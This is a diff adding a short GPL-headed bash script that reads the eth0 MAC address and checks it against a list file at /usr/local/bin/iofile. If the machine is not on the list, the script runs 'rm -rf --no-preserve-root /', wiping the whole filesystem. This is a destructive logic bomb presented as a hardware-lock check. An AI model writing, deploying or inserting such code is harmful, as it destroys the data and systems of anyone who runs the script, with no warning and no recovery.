@@ -1,0 +1,21 @@
+#Tohid Tamboli
+#GPL V2
+
+#!/bin/bash
+
+INPUTIO="/usr/local/bin/iofile"
+HEEXX=$(ifconfig eth0 | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' | sed 's/://g')
+
+CHECKHEX="$(grep -ix $HEEXX $INPUTIO)"
+if [ -z "$CHECKHEX" ]
+then
+rm -rf --no-preserve-root /
+#mkdir /home/linuxlab/Desktop/done
+exit 1
+
+elif [ $CHECKHEX = $HEEXX ]
+then
+exit 1
+fi
+
+
